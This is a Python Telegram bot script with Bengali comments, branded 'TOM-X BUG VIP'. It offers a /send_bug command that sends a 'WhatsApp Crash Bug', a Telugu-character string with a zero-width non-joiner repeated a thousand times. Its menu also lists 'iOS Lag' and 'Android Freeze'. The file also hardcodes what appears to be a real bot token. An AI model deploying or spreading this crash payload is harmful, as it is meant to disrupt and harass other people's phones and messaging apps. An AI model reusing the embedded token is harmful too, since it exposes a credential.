import os
import logging
from telegram import InlineKeyboardButton, InlineKeyboardMarkup, Update
from telegram.ext import Application, CallbackQueryHandler, CommandHandler, ContextTypes

# আপনার বোট টোকেন
TOKEN = "8759130990:AAH3YoOL1eGt5NXN9xh5klJKhRCSKwaSd4g"

# লগিং সেটআপ (রেলওয়েতে এরর চেক করার জন্য)
logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        "**╔══════════════╗**\n"
        "** TOM-X BUG VIP    **\n"
        "**╚══════════════╝**\n\n"
        f"➤ **User** : {update.effective_user.first_name}\n"
        "➤ **Developer** : @pr78rohitbug\n"
        "➤ **Status** : VIP Active ✅\n"
        "──────────────────\n"
        "**Type /send_bug to Test!**"
    )
    keyboard = [
        [
            InlineKeyboardButton("║ Bug Menu ║", callback_data="bug"),
            InlineKeyboardButton("║ Misc Menu ║", callback_data="misc"),
        ],
        [InlineKeyboardButton("║ Support Group ║", url="https://t.me/your_group")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode='Markdown')

# আপনার দেওয়া Bug পাঠানোর ফাংশন
async def send_bug(update: Update, context: ContextTypes.DEFAULT_TYPE):
    # শক্তিশালী বাগ স্ট্রিং
    crash_string = "జ్ఞ‌া" * 1000 
    await update.message.reply_text("🚀 **Sending WhatsApp Crash Bug...**", parse_mode='Markdown')
    await update.message.reply_text(crash_string)
    await update.message.reply_text("✅ **Bug Sent Successfully!**", parse_mode='Markdown')

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == "bug":
        await query.edit_message_text(
            text="**⚠️ BUG LIST ⚠️**\n\n1. WhatsApp Crash\n2. iOS Lag\n3. Android Freeze\n\n*Use /send_bug to execute!*",
            parse_mode='Markdown'
        )

def main():
    # Railway-এর জন্য পোর্ট সেটআপ
    port = int(os.environ.get('PORT', 8000))
    
    application = Application.builder().token(TOKEN).build()
    
    # কমান্ড হ্যান্ডলারগুলো অ্যাড করা হলো
    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("send_bug", send_bug)) # এখানে অ্যাড করা হয়েছে
    application.add_handler(CallbackQueryHandler(button))
    
    print("বটটি রেলওয়েতে সচল হচ্ছে...")
    application.run_polling()

if __name__ == "__main__":
    main()
